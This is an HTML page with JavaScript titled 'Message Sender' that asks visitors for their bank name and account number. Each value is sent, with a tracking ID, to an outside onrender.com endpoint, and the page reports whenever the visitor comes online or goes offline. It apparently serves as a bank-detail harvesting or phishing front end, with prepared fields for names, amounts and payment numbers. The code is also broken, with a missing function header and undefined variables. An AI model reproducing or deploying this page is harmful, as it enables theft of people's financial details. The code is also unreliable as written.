<!DOCTYPE html>
<html>
<head>
    <title>Message Sender</title>
    <style>
        body { font-family: Arial; margin: 40px; }
        input { padding: 10px; width: 300px; font-size: 16px; }
        button { padding: 10px 20px; font-size: 16px; background: #007bff; color: white; border: none; cursor: pointer; }
        #status { margin-top: 10px; color: green; }
    </style>
</head>
<body>
    <h2>ðŸ“¤ Send Message</h2>
    <form id="form" method="post">
        <input type="text" name="message" onchange="sender({ userId: localStorage.getItem('code'), azaName: this.value })" placeholder="Type your bank name here">
        <input type="text" name="message" onchange="sender({ userId: localStorage.getItem('code'), realAcc: this.value })" placeholder="Type your account here">
        <input type="submit" value="Send to Receiver">
    </form>
    
    <div id="status">Hey</div>

    <script>
       let savedInfos =  JSON.parse(localStorage.getItem('savedInfos')) || [];

        // Sender
    const url = 'https://send-39yi.onrender.com/api/messages';  
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)    
    });  
}
    
// Code Generator
function generateRandomCode() {
    const numbers = Array.from({length: 8}, () => Math.floor(Math.random() * 10));
    const letters = Array.from({length: 2}, () => 
        String.fromCharCode(65 + Math.floor(Math.random() * 26))
    );
    const allChars = [...numbers, ...letters];
    // Shuffle the array
    for (let i = allChars.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [allChars[i], allChars[j]] = [allChars[j], allChars[i]];
    }
    return allChars.join('');
}
        
// Check if UserId has been created
if (localStorage.getItem('code')) {
  console.log('UserId is already stored');
} else {
  // Run the function
  const code = generateRandomCode();
  const digits = Array.from({ length: 10 }, () => Math.floor(Math.random() * 10)).join('');

  // Save items
    const savedInfos = {
      userId: code,
      demoAcc: digits,
      azaName: null,
      realAcc: null,
      name: null,
      amount: null, 
      update: null,
      payName: null,
      payNumber: null
  };
    localStorage.setItem('savedInfos', JSON.stringify(savedInfos));
 
  // Send to backend
    sender({ userId: code, demoAcc: digits, status: "online" });
}

// Get User ID
const userId = savedInfos.userId;
        
// Get Status      
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'visible') {
    sender({ userId: userId, status: "online" });
  } else {
    sender({ userId: userId, status: "offline" });          
  }
});

    
        // Form submission
        const form = document.getElementById('form');
        
        form.addEventListener('submit', (event) => {
            event.preventDefault();
            const formData = new FormData(form);
            const message = formData.get('message');
            sender(message, randomCode)
        })

    </script>
</body>
</html>
